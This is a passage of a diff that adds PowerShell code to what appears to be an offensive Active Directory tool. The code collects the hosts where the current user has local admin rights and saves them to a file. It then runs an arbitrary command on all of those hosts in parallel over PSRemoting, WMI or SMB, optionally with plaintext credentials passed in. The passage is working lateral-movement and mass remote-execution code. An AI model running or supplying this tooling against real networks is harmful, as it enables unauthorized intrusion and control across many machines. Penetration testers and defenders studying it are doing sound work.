+				$ComputerAccess += $result.Computer
+			} else {
+				Write-Warning "[-] Failed on $($result.Computer): $($result.Message)"
+			}
+		}
+
+    	$runspaces | ForEach-Object {
+        	$_.Pipe.Dispose()
+    	}
+
+    	$runspacePool.Close()
+    	$runspacePool.Dispose()
+
+ 	#$ComputerAccess = $ComputerAccess | Sort-Object -Unique
+	
+	if($ComputerAccess){
+		$ComputerAccess = $ComputerAccess | Where-Object { $_ }
+		if($InLine){$LineComputerAccess = $ComputerAccess;$LineComputerAccess = $LineComputerAccess -Join ",";Write-Output $LineComputerAccess}
+		else{$ComputerAccess | ForEach-Object { Write-Output $_ }}
+	}
+  	else{Write-Output "[-] No Access"}
+		
+	if($SaveOutput){
+	    	try {
+	        	$ComputerAccess | Out-File $PWD\LocalAdminAccess.txt -Force
+	        	Write-Output ""
+			Write-Output "[+] Output saved to: $PWD\LocalAdminAccess.txt"
+			Write-Output ""
+	    	} catch {
+	        	$ComputerAccess | Out-File "c:\Users\Public\Documents\LocalAdminAccess.txt" -Force
+			Write-Output ""
+	        	Write-Output "[+] Output saved to: c:\Users\Public\Documents\LocalAdminAccess.txt"
+			Write-Output ""
+	    	}
+	} else {Write-Output ""}
+	
+	if ($Command) {
+
+		if ($UserName -and $Password) {
+			$SecPassword = ConvertTo-SecureString $Password -AsPlainText -Force
+			$cred = New-Object System.Management.Automation.PSCredential($UserName, $SecPassword)
+		}
+
+		if ($Method -eq 'SMB') {
+			# Initialize a mutex to synchronize access to sc.exe operations
+			if($scsafe){
+				$Mutex = [System.Threading.Mutex]::new($false, 'SCMutex')
+			}
+		}
+
+		# Create and open a runspace pool
+		$RunspacePool = [RunspaceFactory]::CreateRunspacePool(1, [System.Environment]::ProcessorCount)
+		$RunspacePool.Open()
+
+		$scriptBlock = {
+			param($Computer, $Command, $Method, $cred, $Username, $Password, $WmiScript, $SmbScript)
+
+			try {
+				if ($Method -eq 'PSRemoting') {
+					if ($cred) {
+						$command = $command + " | Out-String -Width 4096"
+						$output = Invoke-Command -ScriptBlock { Invoke-Expression $Using:Command } -ComputerName $Computer -Credential $cred
+					}
+					else {
+     						$command = $command + " | Out-String -Width 4096"
+						$output = Invoke-Command -ScriptBlock { Invoke-Expression $Using:Command } -ComputerName $Computer
+					}
+				}
+				elseif ($Method -eq 'WMI') {
+					. ([ScriptBlock]::Create($WmiScript))
+					if ($cred) {
+						$output = Invoke-WMIRemoting -ComputerName $Computer -Command $Command -Username $Username -Password $Password
+					}
+					else {
+						$output = Invoke-WMIRemoting -ComputerName $Computer -Command $Command
+					}
+				}
+				elseif ($Method -eq 'SMB') {
+					. ([ScriptBlock]::Create($SmbScript))
+					$output = Invoke-SMBRemoting -ComputerName $Computer -Command $Command
+				}
+
+				return @{
+					ComputerName = $Computer
+					Output       = $output
+				}
+			} catch {
+				return @{
+					ComputerName = $Computer
+					Error        = $_.Exception.Message
+				}
+			}
+		}
+
+		$JobObjects = @()
+		
+		if ($Method -eq 'SMB' -AND $scsafe) {
+			foreach ($Computer in $ComputerAccess) {
+				[void]$Mutex.WaitOne()
+				try {
+					$Job = [PowerShell]::Create().AddScript($scriptBlock).AddArgument($Computer).AddArgument($Command).AddArgument($Method).AddArgument($cred).AddArgument($Username).AddArgument($Password).AddArgument($WmiScript).AddArgument($SmbScript)
+					$Job.RunspacePool = $RunspacePool
+					$JobObjects += @{
+						PowerShell = $Job
+						Handle     = $Job.BeginInvoke()
+					}
+				} finally {
+					$Mutex.ReleaseMutex()
+				}
+			}
+		}
+		
+		else{
+
+			foreach ($Computer in $ComputerAccess) {
+				$Job = [PowerShell]::Create().AddScript($scriptBlock).AddArgument($Computer).AddArgument($Command).AddArgument($Method).AddArgument($cred).AddArgument($Username).AddArgument($Password).AddArgument($WmiScript).AddArgument($SmbScript)
+				$Job.RunspacePool = $RunspacePool
+				$JobObjects += @{
+					PowerShell = $Job
+					Handle     = $Job.BeginInvoke()
+				}
+			}
+		}
+
+		# Wait for all jobs to complete
+		if(!$NoOutput){
+			$JobObjects | ForEach-Object { $_.Handle.AsyncWaitHandle.WaitOne() } > $null
+
+			foreach ($Job in $JobObjects) {
+				$Result = $Job.PowerShell.EndInvoke($Job.Handle)
+				
+				if ($Result.Error) {
+					Write-Output "$($Result.ComputerName): Error - $($Result.Error)"
+				} else {
+					Write-Output "[+] $($Result.ComputerName)"
+					Write-Output "$($Result.Output.TrimEnd())"
+					Write-Output ""
+					Write-Output ""
+				}
+				
+				$Job.PowerShell.Dispose()
+			}
+			
+			$RunspacePool.Close()
+		}
+		
+		if ($Method -eq 'SMB' -AND $scsafe) {
+			# Release the mutex
+			$Mutex.Dispose()
+		}
+		
+		Write-Output "[+] Command execution completed"
+		Write-Output ""
+	}
+}
 
 function CheckAdminAccess {
 	
